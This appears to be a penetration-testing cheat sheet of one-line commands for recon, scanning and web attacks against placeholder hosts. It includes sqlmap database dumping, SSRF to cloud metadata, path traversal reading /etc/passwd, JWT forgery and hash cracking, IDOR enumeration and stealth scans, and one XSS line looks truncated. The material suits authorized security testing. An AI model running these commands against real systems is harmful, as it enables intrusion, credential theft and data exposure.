Subdomain Enumeration

Discover subdomains using passive and active techniques and detect takeover opportunities.

Passive Subdomains

subfinder

Collect subdomains using passive sources only.

subfinder -d example.com -silent

Multi-Source Passive

amass

Use amass with all passive sources for maximum coverage.

amass enum -passive -d example.com -o subs.txt

Active (Permutation)

puredns

Bruteforce permutations using a large wordlist.

puredns bruteforce -d example.com -w /wordlists/all.txt

Subdomain Takeover Check

subfinder + subjack

Find subdomains and check for potential takeovers.

subfinder -d example.com | subjack -w fingerprint.txt -t 100

Subdomain Takeover (nuclei)

nuclei

Check all subs for CNAME-based takeover with nuclei templates.

cat subs.txt | nuclei -t takeovers/ -silent

DNS Zone Transfer

dig

Attempt AXFR zone transfer to dump all DNS records.

dig axfr @ns1.example.com example.com

ASN & IP Discovery

Map organizational ownership and resolve domains to IPs.

ASN & CIDR (Whois)

whois

Get ASN, CIDR and organization information.

whois example.com | grep -E "CIDR|AS Name|OrgName"

IP Range from ASN

whois + grep

Pull all CIDR ranges associated with an ASN.

whois -h whois.radb.net -- '-i origin AS12345' | grep -E "^route:"

Resolve to IP

dig

Resolve domain to all A records.

dig +short A example.com

Reverse DNS Lookup

dig

Find hostname associated with an IP address.

dig +short -x 1.2.3.4

Port Scanning

Fast and stealthy port enumeration with service detection.

Fast Full Port Scan

naabu

Scan all 65535 ports rapidly.

naabu -host example.com -p - -silent

Service Version Detection

nmap

Detect services and versions on common ports.

nmap -sV -sC -p 80,443,8080,8443,22,21,3306 example.com

Stealth SYN Scan

nmap

Run stealth SYN scan to avoid detection.

nmap -sS -T2 -p- --min-rate=300 example.com

Ping Sweep (IP Range)

nmap

Discover live hosts within an IP range.

nmap -sP 192.168.1.0/24 -oG - | grep Up

Live Host Discovery

Identify live URLs and IPs to focus your attacks.

Probe for Live URLs

httpx

Probe subdomains for live web services.

cat subdomains.txt | httpx -silent -title -webserver

Status Code Filter

httpx

Filter only 200 OK responses with tech stack info.

cat subs.txt | httpx -mc 200 -tech-detect -silent

Screenshot Live Hosts

gowitness

Take screenshots of all live HTTP services.

gowitness file -f live_hosts.txt --screenshot-path ./shots/

URL Collection & Analysis

Harvest historical URLs, parameterized endpoints and JS‑exposed paths.

Wayback Machine URLs

waybackurls

Grab archived URLs and filter non‑static assets.

waybackurls example.com | grep -v "jpg\|png\|gif" | sort -u

URLs with Parameters

grep

Extract URLs containing parameters for further testing.

cat urls.txt | grep "=" | sort -u

Endpoints from JS Files

getallurls

Pull endpoints leaked inside JavaScript files.

subfinder -d example.com | getallurls -js | sort -u

Extract JS Files

gau + grep

Collect all JavaScript files from multiple sources.

gau example.com | grep "\.js$" | sort -u | tee js_files.txt

Secrets in JS Files

secretfinder

Hunt for API keys and secrets in JS files.

cat js_files.txt | xargs -I{} python3 SecretFinder.py -i {} -o cli

Crawl & Spider

katana

Modern JS-aware crawling with form extraction.

katana -u https://example.com -jc -d 3 -silent

nuclei -l urls.txt -t nuclei-templates/ -severity critical,high -silent

nuclei

XSS Testing

Detect reflected, stored and DOM-based cross-site scripting vulnerabilities.

Reflected XSS (dalfox)

dalfox

Automated XSS scan with parameter mining.

dalfox url "https://example.com/search?q=test" --silence

Bulk URL XSS Scan

dalfox

Pipe parameterized URLs into dalfox for mass scanning.

cat params_urls.txt | dalfox pipe --silence

XSS via Wayback URLs

gxss

Test historical URLs for reflection-based XSS.

waybackurls example.com | gxss -c 100 | dalfox pipe

DOM XSS via Katana

katana + grep

Find potential DOM XSS sinks in crawled pages.

katana -u https://example.com -jc | grep -E "innerHTML|document\.write|eval\("

Blind XSS Headers

curl

Inject blind XSS payload in HTTP headers.

curl -s "https://example.com" -H 'User-Agent: ">'

SQL Injection

Detect and exploit SQL injection vulnerabilities with automated and manual techniques.

SQLMap Basic Scan

sqlmap

Run sqlmap on a single URL with GET parameter.

sqlmap -u "https://example.com/item?id=1" --dbs --batch

SQLi via POST Body

sqlmap

Test POST parameters for SQLi with form data.

sqlmap -u "https://example.com/login" --data="user=a&pass=b" --dbs --batch

Bulk SQLi Detection

sqlmap

Feed parameterized URLs from gau/wayback into sqlmap.

gau example.com | grep "=" | sqlmap -m /dev/stdin --batch --level=3

Error-Based SQLi Detection

grep

Send a single quote and grep for SQL errors in response.

curl -s "https://example.com/item?id=1'" | grep -iE "sql|mysql|syntax|warning|error"

SSRF Testing

Probe for Server-Side Request Forgery vulnerabilities via URL parameters.

SSRF via URL Param

curl

Send request with internal IP to detect SSRF.

curl -s "https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/"

Blind SSRF (Burp Collaborator)

curl

Use an out-of-band collaborator URL to detect blind SSRF.

curl -s "https://example.com/fetch?url=https://YOUR.burpcollaborator.net"

SSRF via Headers

curl

Inject SSRF payloads in common headers like X-Forwarded-For.

curl -s "https://example.com/" -H "X-Forwarded-For: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1"

SSRF Nuclei Templates

nuclei

Automated SSRF detection across URLs using nuclei.

nuclei -l urls.txt -t vulnerabilities/generic/ssrf/ -silent

LFI / RFI Testing

Test for Local and Remote File Inclusion vulnerabilities.

LFI Payload Fuzzing

ffuf

Fuzz file inclusion parameters using LFI payload list.

ffuf -w LFI_payloads.txt -u "https://example.com/file?path=FUZZ" -mr "root:"

LFI via Wrapper (PHP)

curl

Use PHP filter wrapper to read source code via LFI.

curl -s "https://example.com/?page=php://filter/convert.base64-encode/resource=index"

Path Traversal Check

curl

Basic path traversal to read /etc/passwd.

curl -s "https://example.com/?file=../../../../etc/passwd"

Open Redirect Testing

Detect open redirect vulnerabilities exploitable for phishing and token theft.

Basic Open Redirect

curl

Send redirect parameter pointing to an external domain.

curl -s -o /dev/null -w "%{redirect_url}" "https://example.com/redirect?url=https://evil.com"

Bulk Open Redirect

openredirex

Mass test URLs for open redirect via common parameters.

cat urls.txt | openredirex -p payloads/open-redirect.txt

Param Extraction + Test

grep + curl

Extract redirect params from wayback and test them.

waybackurls example.com | grep -iE "redirect|return|url|next|dest" | sort -u

JWT Testing

Attack JWT tokens: algorithm confusion, none attack, weak secrets.

Decode JWT

jwt_tool

Decode and inspect JWT payload without verification.

python3 jwt_tool.py YOUR_JWT_TOKEN

None Algorithm Attack

jwt_tool

Test if server accepts unsigned tokens (alg:none).

python3 jwt_tool.py YOUR_JWT_TOKEN -X a

Weak Secret Crack

hashcat

Crack HS256 JWT secret using wordlist.

hashcat -a 0 -m 16500 jwt.txt /wordlists/rockyou.txt

RS256 → HS256 Confusion

jwt_tool

Exploit algorithm confusion from RSA to HMAC.

python3 jwt_tool.py YOUR_JWT_TOKEN -X k -pk public.pem

API Recon & Testing

Discover hidden API endpoints, test for broken auth and excessive data exposure.

API Endpoint Discovery

ffuf

Fuzz for common API routes with wordlist.

ffuf -u https://example.com/api/FUZZ -w wordlists/api_endpoints.txt -mc 200,201,401,403

API Version Enumeration

ffuf

Discover old/deprecated API versions (v1, v2, v3...).

ffuf -u https://example.com/FUZZ/users -w wordlists/api_versions.txt -mc 200,401

Check for Swagger/OpenAPI

curl

Look for exposed API documentation.

curl -s "https://example.com/api-docs" "https://example.com/swagger.json" "https://example.com/openapi.json"

BOLA / IDOR Test

curl

Test for object-level authorization by changing IDs.

for i in $(seq 1 100); do curl -s "https://example.com/api/user/$i" -H "Authorization: Bearer TOKEN" | grep -v "unauthorized"; done

GraphQL Introspection

curl

Dump entire schema from GraphQL endpoint.

curl -s -X POST "https://example.com/graphql" -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}'
